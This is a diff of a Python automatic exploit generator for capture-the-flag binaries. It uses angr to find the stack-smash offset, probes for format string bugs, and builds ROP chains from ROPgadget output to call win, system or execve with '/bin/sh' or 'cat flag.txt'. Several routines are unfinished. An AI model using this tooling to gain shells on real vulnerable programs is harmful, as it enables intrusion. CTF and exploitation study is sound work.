@@ -2,6 +2,7 @@ import angr, claripy
 import os, subprocess
 import logging
 import argparse
+import ropgadget
 
 from pwn import *
 
@@ -23,23 +24,22 @@ context.update(
 # Important lists to use
 strings =  ["/bin/sh", "cat flag.txt", "flag.txt"]
 exploit_functions = ["win", "system", "execve", "syscall", "print_file"]
-#arg_regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
 arg_regs = [b"rdi", b"rsi", b"rdx", b"rcx", b"r8", b"r9"]
 useful_rop_functions = ["__libc_csu_init"]
 
 
 class rAEG:
 
-    def __init__(self, binary_path):
+    def __init__(self, binary_path, libc_path):
         self.binary = binary_path
         self.elf = context.binary =  ELF(binary_path)
-        #self.libc = context.binary = ELF(libc_path)
+        self.libc = context.binary = ELF(libc_path)
 
-        #self.rop_calls = []
         self.exploit_function = None
 
         self.rop_chain = None
         self.string_address = None
+
 
         self.format_write_address = None
 
@@ -58,8 +58,8 @@ class rAEG:
                     try:
                         index = stack_smash.index(b"CCCCCCCC")
                         self.symbolic_padding = stack_smash[:index]
-                        log.info(f"Found symbolic padding: {self.symbolic_padding}")
-                        log.info(f"Takes {len(self.symbolic_padding)} bytes to smash the instruction pointer")
+                        #log.info(f"Found symbolic padding: {self.symbolic_padding}")
+                        log.info(f"Successfully Smashed the Stack, Takes {len(self.symbolic_padding)} bytes to smash the instruction pointer")
                         simgr.stashes["mem_corrupt"].append(path)
                     except:
                         log.warning("Could not find index of pc overwrite")
@@ -69,7 +69,7 @@ class rAEG:
         return simgr
 
     # Use angr to explore with the check_mem_corruption function
-    def stack_smash(self):
+    def angry_stack_smash(self):
         # Create angr project
         self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
         start_addr = self.elf.sym["main"]
@@ -85,17 +85,30 @@ class rAEG:
         self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
         self.simgr.stashes["mem_corrupt"] = []
 
-        printf_leak_address = None
-        #self.proj.hook_symbol()
 
+        self.printf_leak_address = None
+
+
+        # Check to see if printf is a format string vulnerability
+        # If it is record the address to create a state to smash the stack
+        def analyze_printf(state):
+            # Check if rsi is not a string
+            # If it isn't then we know the vulnerable printf statement
+            varg = state.solver.eval(state.regs.rsi)
+            address = state.solver.eval(state.regs.rip)
+
+            if varg <= 0xff:
+                print(hex(state.callstack.current_return_target))
+
+        self.proj.hook_symbol("printf", analyze_printf)
 
         log.info("Attempting to smash the stack")
         self.simgr.explore(step_func=self.check_mem_corruption)
 
+        self.proj.hook_symbol("printf", analyze_printf)
+
         if len(self.simgr.stashes["mem_corrupt"]) <= 0:
             log.warning("Failed to smash stack")
-        else:
-            log.info("Successfully smashed the stack")
 
 
 
@@ -107,13 +120,13 @@ class rAEG:
         p = self.start_process(None)
         p.sendline(b"%p")
         #p.recvuntil(b"<<<")
-        output = p.recvline()
+        #output = p.recvline()
         logging.getLogger("pwnlib").setLevel(logging.INFO)
-        if b":" in output:
-            output = output.split(b":")[1]
+        #if b":" in output:
+            #output = output.split(b":")[1]
 
-        if not b"%p" in output :
-            log.info(f"[+] Found a format string vulnerability with {output}")
+        #if not b"%p" in output :
+            #log.info(f"[+] Found a format string vulnerability with {output}")
 
             # Check if win function
 
@@ -123,7 +136,7 @@ class rAEG:
             # Check if fopen symbol
 
         #else:
-        self.stack_smash()
+        self.angry_stack_smash()
 
 
 
@@ -171,7 +184,7 @@ class rAEG:
         return None
 
     # Find gadget to control register
-    def find_reg_gadget(self, register):
+    def find_pop_reg_gadget(self, register):
         output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", f"{register}", "--only", "pop|ret"]).split(b"\n")
         output.pop(0)
         output.pop(0)
@@ -188,8 +201,8 @@ class rAEG:
         min_instructions = output[0].count(b";") + 1
         for gadget in output:
             instructions = gadget.count(b";") + 1
-            if instructions < min_instructions:
-                min_instruction = instructions
+            if instructions <= min_instructions:
+                min_instructions = instructions
                 min_gadget = gadget
 
         log.info(f"Found gadget for {register}: {min_gadget}")
@@ -238,7 +251,7 @@ class rAEG:
            instructions = gadget.count(b";") + 1
            if instructions < min_instructions:
                min_instructions = instructions
-               min_gadget =  gadget
+               min_gadget = gadget
 
         log.info(f"Found write primitive gadget: {min_gadget}")
         return min_gadget
@@ -249,6 +262,9 @@ class rAEG:
 
     # Write string to writable address in the binary
     def rop_chain_write_string(self, string):
+
+        chain = b""
+
         return None
 
 
@@ -257,11 +273,11 @@ class rAEG:
     def rop_chain_call_function(self, function, parameters):
 
         chain = b""
-                # If there are any parameters to add to the rop chain then they go in here
+        # If there are any parameters to add to the rop chain then they go in here
         if len(parameters) > 0:
             # If it is a syscall add pop rax, ret and 59 for execve
             if function == "syscall":
-                pop_rax_string= self.find_reg_gadget("rax")
+                pop_rax_string= self.find_pop_reg_gadget("rax")
                 instructions = pop_rax_string.split(b";")
                 pop_rax = p64(int(pop_rax_string.split(b":")[0].strip(),16))
                 chain += pop_rax + p64(59)
@@ -269,17 +285,17 @@ class rAEG:
                 for instruction in instructions[1:]:
                     if b"ret" in instruction:
                         break
-                    print(instruction)
                     param = p64(0)
                     for i in range(len(parameters)):
                         if arg_regs[i] in instruction:
-                            print(parameters[i])
                             param = parameters[i]
                     chain += param
 
             # Reversed in order as the more important parameters go in last
             for i in range(len(parameters)-1, -1, -1):
-                pop_reg_string = self.find_reg_gadget(arg_regs[i].decode())
+                pop_reg_string = self.find_pop_reg_gadget(arg_regs[i].decode())
+                if pop_reg_string == None:
+                    continue
                 instructions = pop_reg_string.split(b";")
                 pop_reg = p64(int(pop_reg_string.split(b":")[0].strip(),16))
                 chain += pop_reg + parameters[i]
@@ -291,7 +307,6 @@ class rAEG:
                         if arg_regs[i] in instruction:
                             #print(arg_regs[i])
                             param = parameters[i]
-                            print(param)
                             break;
                     chain += param
 
@@ -327,6 +342,9 @@ class rAEG:
             self.rop_chain =  self.rop_chain_call_function(self.exploit_function, self.parameters)
 
         return None
+
+
+
 
     def start_process(self, mode):
 
@@ -385,7 +403,8 @@ if __name__ == "__main__":
     #parser.add_argument("libc", help="path of libc shared object")
     args = parser.parse_args()
 
-    rage = rAEG(args.bin)
+    #rage = rAEG(args.bin, "/opt/libc.so.6")
+    rage = rAEG(args.bin, "/usr/lib/libc.so.6")
     rage.find_vulnerability()
     rage.generate_rop_chain()
 
